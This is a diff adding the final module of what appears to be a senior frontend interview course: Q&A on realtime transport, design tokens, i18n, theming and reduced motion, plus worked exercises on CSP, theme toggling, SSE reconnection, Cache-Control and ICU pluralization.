+      <div class="answer"><p>SSE. The data flow is server→client only, low-volume, text — WebSocket's bidirectionality buys nothing. SSE rides plain HTTP: existing cookie auth just works, every proxy/LB passes it, it multiplexes over H2/H3, and <code>EventSource</code> gives <strong>auto-reconnect with <code>Last-Event-ID</code></strong> — the "what did I miss" resume protocol — for free; on WebSocket you'd hand-build reconnect, heartbeat, and resume. Flip to WebSocket when the client pushes at conversational rates (chat, typing indicators, collab editing) or needs binary frames. Mention the caveats that show experience: anti-buffering config for SSE through proxies, heartbeat comments through idle timeouts, and a pub/sub backplane once you have multiple server nodes.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>20. Two users on different servers — how does A's message reach B's WebSocket?</summary>
+      <div class="answer"><p>Server nodes must not be the source of truth for who-hears-what. Standard shape: nodes are dumb pipes; each holds its local sockets and subscribes to a <strong>pub/sub backplane</strong> (Redis pub/sub, Kafka, NATS). A's node publishes the message to the channel/topic; every subscribed node receives it and forwards to its own connected sockets (B's node → B). Complementary pieces: presence/routing table if you need targeted delivery, sticky sessions only for connection affinity (not state), connection draining on deploys, and a replay buffer keyed by sequence ID so reconnecting clients can resume. This paragraph is the expected answer to the scaling half of any realtime design question.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>21. What are design tokens, and why three layers instead of one?</summary>
+      <div class="answer"><p>Named design decisions stored as data (JSON → built into CSS custom properties/TS/native resources). Layers: <strong>primitives</strong> (raw palette: <code>blue-500</code>) → <strong>semantic</strong> (role: <code>color-action-primary</code>) → <strong>component</strong> (<code>button-primary-bg</code>). One flat layer couples components to raw values, so a rebrand or dark mode is a codebase-wide migration; with the semantic indirection, themes are <em>reassignments of layer 2</em> under a scope (<code>[data-theme]</code>) — zero component changes. Discipline that makes it work: semantic names describe role, never appearance (<code>text-danger</code>, not <code>red-text</code>), and components consume only layers 2–3.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>22. How do you version and evolve a design system consumed by 20 teams without breaking them?</summary>
+      <div class="answer"><p>Treat it as a product with an API contract: strict semver (visual breaking changes are majors), changesets automating versioning/changelogs, deprecation with dev-time warnings and a published removal horizon, and <strong>codemods shipped with breaking releases</strong> so migration is mechanical. Distribution as a versioned package so teams adopt on their schedule (support N-1); usage telemetry to know what's actually consumed before removing anything. Storybook + visual regression as the CI contract — a padding change produces a reviewable visual diff. Governance: small core team owns tokens/architecture; product teams contribute via a documented incubate→promote path so the system scales without becoming a bottleneck or a dumping ground.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>23. Why does string concatenation break translation, and what's the fix?</summary>
+      <div class="answer"><p>Concatenation hardcodes English grammar: word order (German verbs move), pluralization (Arabic has six CLDR plural categories; Japanese doesn't inflect), gender agreement, and spacing conventions. Translators need the <em>whole sentence</em> to produce correct grammar. Fix: ICU MessageFormat — one complete message per key with typed placeholders and plural/select logic inside the translatable string: <code>{count, plural, one {# message} other {# messages}}</code>; each locale supplies its own branches via <code>Intl.PluralRules</code>. Corollaries: no key reuse across contexts, rich-text placeholders instead of JSX fragment stitching, and <code>Intl.*</code> (NumberFormat/DateTimeFormat/Segmenter/Collator) instead of hand-formatting numbers, dates, string lengths, and sort orders.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>24. Implement a dark-mode toggle with no flash of the wrong theme. Where does the code run?</summary>
+      <div class="answer"><p>The deciding code must run <strong>before first paint</strong>, so it's a tiny render-blocking inline script in <code>&lt;head&gt;</code> (with a CSP nonce/hash): read <code>localStorage.theme</code>; if absent, fall back to <code>matchMedia('(prefers-color-scheme: dark)')</code>; set <code>data-theme</code> and <code>style.colorScheme</code> on <code>&lt;html&gt;</code>. A <code>useEffect</code> version runs after paint → white flash for dark users. Three states matter: light/dark/system, where "system" = <em>remove</em> the stored key and follow a <code>matchMedia</code> change listener live. SSR: either accept the inline-script approach or store the choice in a cookie so the server renders the attribute. CSS side: semantic tokens reassigned under <code>[data-theme="dark"]</code>, plus <code>color-scheme</code> so form controls and scrollbars follow.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>25. How would you architect dark mode so designers can add a brand theme next year?</summary>
+      <div class="answer"><p>Make "dark" the second theme, not a special case: components consume only <strong>semantic tokens</strong> (<code>--color-surface</code>, <code>--color-action-primary</code>) via CSS custom properties; a theme is a scope that reassigns them (<code>[data-theme="dark"]</code>, later <code>[data-brand="acme"]</code> — attributes compose, so acme-dark falls out for free). The token source of truth lives in JSON with a build step emitting each theme's CSS; adding a brand = adding a token file and design QA, zero component edits. Guardrails that keep it true: lint against raw hex in components, semantic (role-based) token names, contrast checks per theme in CI, and separate elevation/surface tokens because dark mode communicates depth with lighter surfaces, not shadows.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>26. What does prefers-reduced-motion actually require of you? Is removing all animation correct?</summary>
+      <div class="answer"><p>It signals that motion physically harms the user — vestibular disorders make parallax, zooms, and large translations cause dizziness and nausea. "Reduce" ≠ "remove": deleting all transitions turns state changes into causeless teleports, which hurts comprehension. Correct: neutralize the <em>vestibular triggers</em> (large movement, scaling, parallax, autoplay) and keep or substitute gentle cues — a slide becomes a fade, smooth scroll becomes instant, carousels stop autoplaying. Implementation: the <code>@media (prefers-reduced-motion: reduce)</code> block per animation (or a global duration-kill fallback), <code>matchMedia</code> gating for JS/scroll-linked animation, and honoring it inside View Transitions and animation libraries. Adjacent WCAG facts: pause control for anything auto-moving &gt; 5 s, no flashing &gt; 3×/second.</p></div>
+    </details>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="exercises">Hands-on exercises</h2>
+
+    <div class="exercise">
+      <h4>Exercise 1 — Write and defend a CSP</h4>
+      <p>Your app: a React SPA served by Next.js, calling <code>api.example.com</code>, loading fonts locally, images from <code>cdn.example.com</code>, and one analytics script from <code>analytics.vendor.com</code>. Write the strictest workable CSP, then explain each directive in one line as if to a reviewer. Then answer: what breaks first when you turn it on, and how do you find out <em>before</em> users do?</p>
+      <details><summary>Solution</summary>
+<pre><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'nonce-{PER_RESPONSE}' 'strict-dynamic' https: 'unsafe-inline';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' cdn.example.com data:;
+  font-src 'self';
+  connect-src 'self' api.example.com analytics.vendor.com;
+  frame-ancestors 'self';
+  object-src 'none';
+  base-uri 'none';
+  form-action 'self';
+  report-to csp-endpoint</code></pre>
+        <p>Line-by-line: <code>default-src 'self'</code> is the deny-by-default floor every unlisted directive inherits. <code>script-src</code> uses a per-response nonce (Next stamps it on its own script tags) + <code>'strict-dynamic'</code> so nonced entry scripts may load their chunks; <code>https: 'unsafe-inline'</code> are ignored-by-modern-browsers fallbacks for old ones. The analytics script must be loaded <em>by</em> your nonced code (or given the nonce) — allowlisting its domain alone is the bypassable pattern. <code>style-src 'unsafe-inline'</code> is the pragmatic concession for CSS-in-JS runtimes (tighten to nonces if your stack allows). <code>connect-src</code> limits where injected code could exfiltrate; <code>base-uri 'none'</code> stops <code>&lt;base&gt;</code> hijacks; <code>object-src 'none'</code> kills plugin vectors; <code>form-action</code> stops injected forms posting elsewhere.</p>
+        <p>What breaks first: inline scripts you forgot (third-party embeds, GTM, that one <code>onclick=""</code>), and dev-mode eval. You find out by shipping the identical policy as <code>Content-Security-Policy-Report-Only</code> with a <code>report-to</code> endpoint for a week and triaging violations — zero user impact, complete inventory.</p>
+      </details>
+    </div>
+
+    <div class="exercise">
+      <h4>Exercise 2 — The no-FOUC three-state theme toggle</h4>
+      <p>Implement light/dark/system theming: a blocking head script (no flash on load), a React <code>useTheme()</code> hook exposing <code>{theme, setTheme}</code> where "system" tracks OS changes live, persistence, and cross-tab sync. State exactly why the head script can't be a <code>useEffect</code>.</p>
+      <details><summary>Solution</summary>
+<pre><code><span class="com">&lt;!-- index.html head — runs before first paint; nonce it under CSP --&gt;</span>
+&lt;script&gt;
+(<span class="kw">function</span> () {
+  <span class="kw">try</span> {
+    <span class="kw">var</span> s = localStorage.getItem(<span class="str">'theme'</span>);              <span class="com">// 'light'|'dark'|null(=system)</span>
+    <span class="kw">var</span> t = s || (matchMedia(<span class="str">'(prefers-color-scheme: dark)'</span>).matches ? <span class="str">'dark'</span> : <span class="str">'light'</span>);
+    document.documentElement.dataset.theme = t;
+    document.documentElement.style.colorScheme = t;
+  } <span class="kw">catch</span> (e) {}
+})();
+&lt;/script&gt;</code></pre>
+<pre><code><span class="kw">function</span> <span class="typ">useTheme</span>() {
+  <span class="kw">const</span> [pref, setPref] = useState(() =&gt; localStorage.getItem(<span class="str">'theme'</span>) ?? <span class="str">'system'</span>);
+
+  useEffect(() =&gt; {
+    <span class="kw">const</span> mq = matchMedia(<span class="str">'(prefers-color-scheme: dark)'</span>);
+    <span class="kw">const</span> apply = () =&gt; {
+      <span class="kw">const</span> t = pref === <span class="str">'system'</span> ? (mq.matches ? <span class="str">'dark'</span> : <span class="str">'light'</span>) : pref;
+      document.documentElement.dataset.theme = t;
+      document.documentElement.style.colorScheme = t;
+    };
+    apply();
+    mq.addEventListener(<span class="str">'change'</span>, apply);                 <span class="com">// live OS tracking in system mode</span>
+    <span class="kw">const</span> onStorage = (e) =&gt; {                            <span class="com">// cross-tab sync</span>
+      <span class="kw">if</span> (e.key === <span class="str">'theme'</span>) setPref(e.newValue ?? <span class="str">'system'</span>);
+    };
+    addEventListener(<span class="str">'storage'</span>, onStorage);
+    <span class="kw">return</span> () =&gt; { mq.removeEventListener(<span class="str">'change'</span>, apply); removeEventListener(<span class="str">'storage'</span>, onStorage); };
+  }, [pref]);
+
+  <span class="kw">const</span> setTheme = (next) =&gt; {          <span class="com">// 'light' | 'dark' | 'system'</span>
+    next === <span class="str">'system'</span> ? localStorage.removeItem(<span class="str">'theme'</span>)   <span class="com">// system = ABSENCE of override</span>
+                       : localStorage.setItem(<span class="str">'theme'</span>, next);
+    setPref(next);
+  };
+  <span class="kw">return</span> { theme: pref, setTheme };
+}</code></pre>
+        <p>Why not <code>useEffect</code> for the initial application: effects run <em>after</em> React commits and the browser has painted — a dark-mode user gets one light-themed frame (or many, on slow devices) every load. The decision must be render-blocking, which is exactly the one legitimate use of a blocking inline head script.</p>
+      </details>
+    </div>
+
+    <div class="exercise">
+      <h4>Exercise 3 — SSE client with reconnect + resume</h4>
+      <p>Build a notifications client on <code>EventSource</code>: parse JSON events, survive server restarts, resume missed events after disconnection, and fall back to giving up gracefully after repeated failures. Then note what the server must do to make resume work — and when you'd need to abandon <code>EventSource</code> for a fetch-stream.</p>
+      <details><summary>Solution</summary>
+<pre><code><span class="kw">function</span> <span class="typ">connectNotifications</span>({ onEvent, maxRetries = <span class="num">8</span> }) {
+  <span class="kw">let</span> es, failures = <span class="num">0</span>, closedByUs = <span class="kw">false</span>;
+
+  <span class="kw">function</span> open() {
+    es = <span class="kw">new</span> EventSource(<span class="str">'/api/notifications'</span>);   <span class="com">// cookies ride along; custom headers impossible</span>
+
+    es.onopen = () =&gt; { failures = <span class="num">0</span>; };            <span class="com">// healthy again — reset backoff</span>
+
+    es.addEventListener(<span class="str">'notification'</span>, (e) =&gt; {
+      <span class="com">// e.lastEventId is set from the "id:" field — the browser REMEMBERS it and</span>
+      <span class="com">// sends "Last-Event-ID: &lt;id&gt;" automatically on every auto-reconnect.</span>
+      onEvent(JSON.parse(e.data));
+    });
+
+    es.onerror = () =&gt; {
+      <span class="com">// EventSource auto-reconnects on transient errors (honoring "retry:").</span>
+      <span class="com">// readyState CLOSED means it gave up (e.g. HTTP 4xx/5xx) — then WE own retry:</span>
+      <span class="kw">if</span> (es.readyState === EventSource.CLOSED &amp;&amp; !closedByUs) {
+        <span class="kw">if</span> (++failures &gt; maxRetries) <span class="kw">return</span> onEvent({ type: <span class="str">'degraded'</span> }); <span class="com">// surface to UI, offer refresh</span>
+        <span class="kw">const</span> delay = Math.min(<span class="num">30000</span>, <span class="num">1000</span> * <span class="num">2</span> ** failures) * (<span class="num">0.5</span> + Math.random()); <span class="com">// jittered backoff</span>
+        setTimeout(open, delay);
+      }
+    };
+  }
+  open();
+  <span class="kw">return</span> () =&gt; { closedByUs = <span class="kw">true</span>; es.close(); };  <span class="com">// cleanup for the React effect</span>
+}</code></pre>
+        <p>Server obligations for resume: put a monotonic <code>id:</code> on every event; on a request carrying <code>Last-Event-ID</code>, replay everything after that ID from a retention buffer (or send a <code>snapshot</code> event when the gap is too old); send periodic comment lines (<code>: ping</code>) to defeat proxy idle timeouts, and disable response buffering (e.g. <code>X-Accel-Buffering: no</code>). Abandon <code>EventSource</code> for a <code>fetch()</code> + <code>ReadableStream</code> parser when you must send an <code>Authorization</code> header or need POST bodies (the common LLM-streaming case) — you then re-implement reconnect/resume yourself, which is exactly what <code>EventSource</code> was giving you for free.</p>
+      </details>
+    </div>
+
+    <div class="exercise">
+      <h4>Exercise 4 — Cache-Control for a mixed asset inventory</h4>
+      <p>Assign headers to each, with one-line justifications: (a) <code>/assets/app.3f9c2e.js</code>, (b) <code>/index.html</code>, (c) <code>/avatars/u123.jpg</code> (re-uploadable at the same URL), (d) <code>/api/me</code>, (e) <code>/api/products?page=1</code> (public, changes ~hourly), (f) <code>/fonts/inter-var.woff2</code> (versioned directory), (g) a CSV export of the user's financial data.</p>
+      <details><summary>Solution</summary>
+<pre><code>(a) Cache-Control: public, max-age=31536000, immutable
+    <span class="com"># content-hashed → URL is the version; never revalidate, even on reload</span>
+(b) Cache-Control: no-cache            <span class="com"># + ETag</span>
+    <span class="com"># store but revalidate every use — the mutable pointer must never be stale;</span>
+    <span class="com"># CDN variant: max-age=0, s-maxage=300, stale-while-revalidate=60</span>
+(c) Cache-Control: private, max-age=300, stale-while-revalidate=3600  <span class="com"># + ETag</span>
+    <span class="com"># mutable URL → short freshness + cheap 304s; 'private' if avatars can be</span>
+    <span class="com"># permission-gated. (Better design: hash the URL and make it case (a).)</span>
+(d) Cache-Control: private, no-store
+    <span class="com"># per-user, sensitive; 'private, max-age=0' + ETag if you want 304 efficiency</span>
+(e) Cache-Control: public, s-maxage=600, stale-while-revalidate=300, max-age=60
+    <span class="com"># CDN absorbs the traffic and refreshes in background; browsers stay short</span>
+(f) Cache-Control: public, max-age=31536000, immutable
+    <span class="com"># versioned path = content-addressed in practice; fonts are the classic</span>
+    <span class="com"># repeat-download waste. (Add crossorigin handling per font-fetch rules.)</span>
+(g) Cache-Control: no-store
+    <span class="com"># financial data must never persist in any cache — browser, CDN, or proxy;</span>
+    <span class="com"># pair with Content-Disposition: attachment</span></code></pre>
+        <p>Meta-lesson to say out loud: the policy follows from two questions — <em>is the URL content-addressed or mutable?</em> and <em>is the response public, per-user, or sensitive?</em> Every row is just those two axes.</p>
+      </details>
+    </div>
+
+    <div class="exercise">
+      <h4>Exercise 5 — De-hardcode a string with ICU pluralization</h4>
+      <p>Refactor this to a proper ICU message (react-intl or i18next-ICU), correct for a locale with more than two plural forms, and handle the zero case with better UX than "0 items":</p>
+<pre><code>&lt;span&gt;{count} item{count !== <span class="num">1</span> &amp;&amp; <span class="str">'s'</span>} in your cart, {name}&lt;/span&gt;</code></pre>
+      <details><summary>Solution</summary>
+<pre><code><span class="com">// en.json — ONE complete message; grammar lives with the translator:</span>
+{
+  <span class="str">"cart.summary"</span>: <span class="str">"{count, plural, =0 {Your cart is empty, {name}} one {# item in your cart, {name}} other {# items in your cart, {name}}}"</span>
+}
+
+<span class="com">// pl.json — Polish needs few/many; only the translation file changes:</span>
+{
+  <span class="str">"cart.summary"</span>: <span class="str">"{count, plural, =0 {Twój koszyk jest pusty, {name}} one {# przedmiot w koszyku, {name}} few {# przedmioty w koszyku, {name}} many {# przedmiotów w koszyku, {name}} other {# przedmiotu w koszyku, {name}}}"</span>
+}
+
+<span class="com">// Component:</span>
+&lt;FormattedMessage id=<span class="str">"cart.summary"</span> values={{ count, name }} /&gt;
+<span class="com">// or: intl.formatMessage({ id: 'cart.summary' }, { count, name })</span></code></pre>
+        <p>Why each piece matters: <code>=0</code> is an <em>exact-match</em> override for UX copy ("empty" beats "0 items") and is distinct from the CLDR <code>zero</code> category; <code>one/few/many/other</code> are selected by <code>Intl.PluralRules</code> per locale, so English ships two branches and Polish ships four <em>without any code change</em>; <code>#</code> is the locale-formatted number. The original code was unfixable by translation because the <code>'s'</code> suffix logic — English grammar — was compiled into the component. Bonus checks: the name placeholder stays a placeholder (never concatenate), and pseudo-localization would have flagged this string as hardcoded.</p>
+      </details>
+    </div>
+
+    <div class="note">
+      That's the course. You've covered the full senior-frontend surface: fundamentals (01–03), language internals (04–06),
+      React deep (07–14), and at-scale engineering (15–18). Final prep advice: re-run every tutorial's Q&amp;A cold, rehearse
+      the narrative answers out loud (URL-to-pixels, the perf story, the CORS preflight walk-through, the token-storage
+      argument), and come back to chat for mock-interview drills on anything that wobbles.
+    </div>
+  </section>
+
+  <nav class="page-nav">
+    <a href="17-web-performance-cwv.html">← Prev: Web Performance &amp; Core Web Vitals</a>
+    <a href="index.html">Course Home →</a>
+  </nav>
+
+</main>
+</body>
+</html>
